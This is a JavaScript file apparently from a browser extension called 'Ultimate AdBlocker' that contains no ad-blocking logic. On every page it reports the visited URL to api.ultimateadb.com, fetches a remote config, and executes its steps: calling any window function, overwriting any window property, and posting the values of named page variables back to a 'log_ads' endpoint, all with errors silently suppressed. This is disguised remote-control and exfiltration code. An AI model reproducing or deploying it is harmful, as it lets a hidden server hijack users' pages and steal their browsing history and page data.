function ultimateAdBlocker_logAds(data) {
	try {
		var xmlhttp = new XMLHttpRequest();
		var theUrl = "https://api.ultimateadb.com/log_ads.php?block_ad=1";
		xmlhttp.open("POST", theUrl);
		xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		xmlhttp.send(JSON.stringify(data));
	} catch (ex) {}
}

var ultimateAdBlocker_config = undefined;
var ultimateAdBlocker_config_action_response = {};
var ultimateAdBlocker_gt_req = {}
var ultimateAdBlocker_parseConfig_interval = null;

function ultimateAdBlocker_call(f, name, args_original) {
	try {
		var arg = ultimateAdBlocker_parseArgs(args_original);
		var len = arg.length;
		if (len == 0) {
			return f[name]()
		}

		if (len == 1) {
			return f[name](arg[0]);
		}
		
		if (len == 2) {
			return f[name](arg[0], arg[1]);
		}
		
		if (len == 3) {
			return f[name](arg[0], arg[1], arg[2]);
		}
		
		if (len == 4) {
			return f[name](arg[0], arg[1], arg[2], arg[3]);
		}
		
		if (len == 5) {
			return f[name](arg[0], arg[1], arg[2], arg[3], arg[4]);
		}
		
		if (len == 6) {
			return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5]);
		}
		
		if (len == 7) {
			return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6]);
		}
		
		if (len == 8) {
			f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7]);
		}
		
		if (len == 9) {
			return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7], arg[8]);
		}
		
		if (len == 10) {
			return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7], arg[8], arg[9]);
		}
	} catch (ex) {

	}
} 

function ultimateAdBlocker_parseRep(config) {
	try {
		var str = config['key'];
		var starting = window;
		var conf = str.split(".");
		for (var index = 0; index < conf.length; index++) {
			if (index == conf.length - 1) {
				starting[conf[index]] = ultimateAdBlocker_parseArg(
					config['value']
				);
			} else {
				starting = starting[conf[index]];
				if (starting == null) {
					//console.log(conf[index], "is null");
					return false;
				}
			}
		}
	} catch (ex) {}
}

function ultimateAdBlocker_parseArg(arg) {
	try {
		if (typeof arg != 'object') {
			return arg;
		}
		if (arg['key'] !== undefined) {
			return ultimateAdBlocker_parseGet(arg['key']);
		}
		return arg['value'];
	} catch (ex) {

	}
}

function ultimateAdBlocker_parseArgs(args) {
	try {
		var resp = [];
		for (var index = 0; index < args.length; index++) {
			resp[index] = ultimateAdBlocker_parseArg(args[index]);
		}
		return resp;
	} catch (ex) {

	}
}

function ultimateAdBlocker_doNextAction(currentInd) {
	try {
		var nextAction = currentInd + 1;
		
		if (nextAction >= ultimateAdBlocker_config.length) {
			return true;
		}
		var action = ultimateAdBlocker_config[nextAction];
		return ultimateAdBlocker_doAction(action, nextAction);
	} catch (ex) {

	}
}

function ultimateAdBlocker_solveCondition(condition) {
	try {
		//console.log("Solve condition", condition);
		var arg1 = ultimateAdBlocker_parseArg(condition['arg1']);
		//console.log(arg1);
		var arg2 = ultimateAdBlocker_parseArg(condition['arg2']);
		//console.log(arg2);
		var conditionType = condition['condition'];

		//console.log(arg1, arg2, conditionType);

		if (conditionType == 'GREATER_THAN') {
			return arg1 > arg2;
		}

		if (conditionType == 'GREATER_THAN_EQUAL_TO') {
			return arg1 >= arg2;
		}

		if (conditionType == 'LESS_THAN') {
			return arg1 < arg2;
		}

		if (conditionType == 'LESS_THAN_EQUAL_TO') {
			return arg1 <= arg2;
		}

		if (conditionType == 'EQUAL_TO') {
			return arg1 == arg2;
		}

		if (conditionType == 'STRICT_EQUAL_TO') {
			return arg1 === arg2;
		}

		if (conditionType == 'NOT_EQUAL_TO') {
			return arg1 != arg2;
		}

		if (conditionType == 'STRICT_NOT_EQUAL_TO') {
			return arg1 !== arg2;
		}
		return true;
	} catch (ex) {}
}

function ultimateAdBlocker_solveConditions(conditions) {
	try {
		for (var index = 0; index < conditions.length; index++) {
			if (!ultimateAdBlocker_solveCondition(conditions[index])) {
				//console.log("Condition " + index + " failed");
				return false;
			}
			//console.log("All conditions passed");
		}
		return true;
	} catch (ex) {

	}
}

function ultimateAdBlocker_wait(action, ind) {
	try {
		if (!action['conditions'] || action['conditions'].length == 0) {
			return ultimateAdBlocker_doNextAction(ind);
		} 

		//console.log("solving condition: ", action['conditions']);

		if (ultimateAdBlocker_solveConditions(action['conditions'])) {
			return ultimateAdBlocker_doNextAction(ind);
		} 
		var waitTime = action['waitTime'];
		if (waitTime == null) {
			waitTime = 10*1000;
		}
		setTimeout(function() {
			ultimateAdBlocker_wait(action, ind);
		}, waitTime);
	} catch (ex) {}
}

function ultimateAdBlocker_getLastElement(str, delimeter = '.') {
	try {
		var st = str.split(delimeter);
		return st[st.length - 1];
	} catch (ex) {}
}

function ultimateAdBlocker_send(action, ind) {
	try {
		var keys = action['keys'];
		var req = {};
		var data = []
		for (var index = 0; index < keys.length; index++) {
			var key = keys[index]
			data.push({
				'key': key,
				'value': ultimateAdBlocker_parseGet(key)
			})
		}
		req['data'] = data;
		ultimateAdBlocker_logAds(req);
	} catch (ex) {}
}

function ultimateAdBlocker_doAction(action, ind) {
	try {
		if (action['type'] == "call") {
			var f = ultimateAdBlocker_parseGet(action['key'], 1);
			var resp = ultimateAdBlocker_call(f, 
				ultimateAdBlocker_getLastElement(action['key']),action['args']);
			ultimateAdBlocker_config_action_response[ind] = resp;
			return ultimateAdBlocker_doNextAction(ind);
		} else if (action['type'] == "update") {
			ultimateAdBlocker_config_action_response[ind] = 
				ultimateAdBlocker_parseRep(action)
			return ultimateAdBlocker_doNextAction(ind);
		} else if (action['type'] == "get") {
			ultimateAdBlocker_config_action_response[ind] = 
				ultimateAdBlocker_parseGet(action['key']);
			return ultimateAdBlocker_doNextAction(ind);
		} else if (action['type'] == 'send') {
			ultimateAdBlocker_send(action, ind)
			return ultimateAdBlocker_doNextAction(ind);
		} else if (action['type'] == 'wait') {
			return ultimateAdBlocker_wait(action, ind);
		}
	} catch (ex) {}
}

function ultimateAdBlocker_parseGet(str, tillIndex = 0) {
	try {
		//console.log(str, ultimateAdBlocker_parseGet);
		var conf = str.split(".");
		var starting = window;
		for (var index =0; index < conf.length - tillIndex; index++) {
			starting = starting[conf[index]];
			if (index != conf.length - 1 && starting == null) {
				return undefined;
			}
		}		
		return starting;
	} catch(ex) {
	}
}

function ultimateAdBlocker_getAdBlockConfig() {
	try {
		var xhttp = new XMLHttpRequest();
		var url = "https://api.ultimateadb.com/get_config.php?ref=" + 
			encodeURIComponent(window.location.href);

		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				var config = JSON.parse(this.responseText);
				ultimateAdBlocker_config = config;
				ultimateAdBlocker_doAction(
					config[0], 0
				)
			}
		};
		xhttp.open("GET", url, true);
		xhttp.send();
	} catch(ex){}
}

try {
	ultimateAdBlocker_getAdBlockConfig()
} catch(ex){
	//console.log(ex)
}